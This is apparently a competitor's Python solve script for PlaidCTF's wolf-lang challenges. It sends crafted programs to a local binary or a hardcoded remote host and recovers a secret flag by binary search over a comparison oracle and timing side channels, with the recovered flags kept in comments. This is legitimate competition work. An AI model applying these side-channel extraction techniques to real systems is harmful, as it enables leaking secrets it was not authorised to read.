#!/usr/bin/env python
from pwn import *
context(log_level='WARN')
#os.chdir('./pupper')
assert sys.argv[1] in ['pupper', 'doggo', 'woofer']
localpath, port = {
    'pupper': ('./pupper', 6808),
    'doggo': ('./doggo', 4856),
    'woofer': ('./woofer', 6613),
    }[sys.argv[1]]

os.chdir(localpath)
#host = 'wolf.chal.pwning.xxx' # having DNS issues, so manually resolved IP
host = '149.28.38.154'
def query_pupper(x):
    p = process("./wolf-lang") if "--live" not in sys.argv else remote(host, port)
    s = "if flag > %d then 1 else 0\n" % (x,)
    s = s.ljust(2048, "\n")
    p.send(s)
    r = p.recv()
    #p.wait_for_close()
    p.close()
    return r
def query_doggo(x):
    p = process("./wolf-lang") if "--live" not in sys.argv else remote(host, port)
    s = '''
let x = ref 0 in
let f = (fn (y : int) => x := y; y)
        :> private (int -> private int) in
let z = if flag > %d then f 1 else f 0 in
!x''' % (x,)
    s = s.ljust(2048, "\n")
    p.send(s)
    r = p.recv()
    p.close()
    return r
def query_woofer(x, boolean):
    NUM_SAMPLES = 1
    q1 = 149604311948025847096811232398024376981557864992675930794679428006324331551361625718248023801370042111157798613
    q2 = 6304395898313367402798996343483651022663135884888177336389643530583399327187976713662985466099199830422689433677
    primes_ctx = 'let a = %d in let b = %d in %s' % (q1, q2, '%s')
    delay_expr = '9'
    for _ in range(350):
        delay_expr = '%s*a%%b' % (delay_expr,)
    delay = primes_ctx % (delay_expr,)
    #print len(delay)
    #print delay

    #delay2 = '0'
    #for _ in range(100):
    #    delay2 = 'if true then 0 else %s' % (delay2,)
    #print len(delay2)
    #print delay2

    #s = 'if flag > 1 then %s :> private int else 0:>private int;()' % (delay,)
    #s = 'let f = fn (x : private int) => %s :> private int in let g = fn (x : private int) => 0 :> private int in (if flag > 1 then f flag else g flag);()' % (delay,)
    s = '''
let f = (fn (x : private int) => %s :> private int)
    :> private (private int -> private int) in
let g = (fn (x : private int) => 0 :> private int)
    :> private (private int -> private int) in
let q = ref f in
let r = ref g in
(ref 0 := let x = (if flag > 1 then r := f :> private unit else r := g :> private unit) in 0);!r flag;()''' % (delay,)
#'''(if flag > 1 then r := f :> private unit else r := g :> private unit);!r flag;()''' % (delay,)
#'''(if %s then q else r) := g; !q flag;()''' % (delay, boolean)
#'''(if flag > 1 then q else r :> ref private (private int -> private int)) := g; !q flag;()''' % (delay)
    #print len(s)
    #print s

    #s = 'let r=ref 0in let a0=fn(x:int)=>if 0=1then ref flag else ref flag in '
    #for i in range(1,35):
    #    s += 'let a%d = fn(x:int)=>if 0=1 then a%d 0else a%d 1 in ' % (i, i-1, i-1)
    #s += '!r'

    s = 'let r = ref 0in let a0=fn(x:int)=>ref ();ref ();():>private unit in '
    s += 'let z=0:>private int in '
    for i in range(1,32):
        #s += 'let a%d = fn(x:int)=>a%d 0;a%d 1;a%d 2;a%d 3 in ' % (i, i-1, i-1, i-1, i-1)
        #s += 'let a%d = fn(x:int)=>a%d 0;a%d 1;a%d 2 in ' % (i, i-1, i-1, i-1)
        #s += 'let a%d = fn(x:int)=>a%d 0;a%d 1 in ' % (i, i-1, i-1)
        s += 'let a%d = fn(x:int)=>if %s then z else a%d 0;a%d 1;z in ' % (i, boolean, i-1, i-1)
    #s += 'if %s then 0 else a5 0; !r' % (boolean,)
    s += '(if %s :> private bool then a3 0 else a15 0);!r' % (boolean,)
    print len(s)
    print s


    s = s.ljust(2048, "\n")
    
    samples = []
    for _ in range(NUM_SAMPLES):
        p = process("./wolf-lang") if "--live" not in sys.argv else remote(host, port)
        start = time.time()
        p.send(s)
        r = p.recv()
        end = time.time()
        p.close()
        p.wait_for_close()
        print r
        samples.append(end-start)
    print(sum(samples)/float(NUM_SAMPLES))
    return samples

if sys.argv[1] == 'woofer':
    print query_woofer(0, '0=0')
    print query_woofer(0, '0=1')
else:
    upper = 1
    upper = 248661618204893321077691124073410420050228075398673858720231988446579748506266687766528 >> 1
    #upper = int('PCTF{0of_0uch_0wi3_my_IF_$t4t3n\x00\x00\x00\x00\x00'.encode('hex'), 16)
    while '1' in query_doggo(upper):
        print(hex(upper))
        upper <<= 1
    print upper
    def bsearch(f, lo, hi):
        #x, y, z = f(lo), f((lo + hi)/2), f(hi)
        #print(lo, hi)
        if (hi - lo) <= 2:
            print lo, hi
            return lsearch(f, lo, hi)
        tmp = (lo + hi)/2
        out = hex(tmp)[2:]
        #print(len(out))
        if len(out)%2 == 1:
            out = '0' + out
        print(repr(out.decode('hex')))
        #print(lo, hi, tmp)
        x = None
        while not x:
            try:
                x = f(tmp)
            except EOFError:
                print tmp
                pass
        if '1' in x:
            return bsearch(f, tmp, hi)
        else:
            return bsearch(f, lo, tmp)

    def lsearch(f, lo, hi):
        for i in range(hi-lo+1):
            tmp = f(lo+i)
            print i, tmp
            if '0' in tmp:
                return lo + i

    if sys.argv[1] == 'pupper':
        flag = bsearch(query_pupper, upper >> 1, upper)
        #'PCTF{0of_0uch_0wi3_my_IF_$t4t3m3n7s}'
    if sys.argv[1] == 'doggo':
        flag = bsearch(query_doggo, upper >> 1, upper)
        #'PCTF{$h0u1d_h4v3_f0rma11y_v3r1fi3d!}'
    print(hex(flag)[2:].decode('hex'))
